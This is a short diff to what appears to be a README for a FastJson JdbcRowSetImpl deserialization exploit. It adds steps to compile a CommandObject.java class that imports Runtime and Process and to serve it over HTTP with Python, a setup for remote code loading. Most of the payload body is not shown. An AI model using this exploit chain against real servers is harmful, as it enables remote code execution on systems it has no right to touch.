@@ -17,6 +17,8 @@ root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/ma
 
 CommandObject.java
 
+javac CommandObject.java
+
 ```
 import	java.lang.Runtime;
 import	java.lang.Process;
@@ -38,4 +40,12 @@ public class CommandObject {
         CommandObject e = new CommandObject();
     }
 }
+```
+
+开启一个HTTP服务
+
+如：
+```
+Python2 -m SimpleHTTPServer 80
+Python3 -m http.server 80
 ```
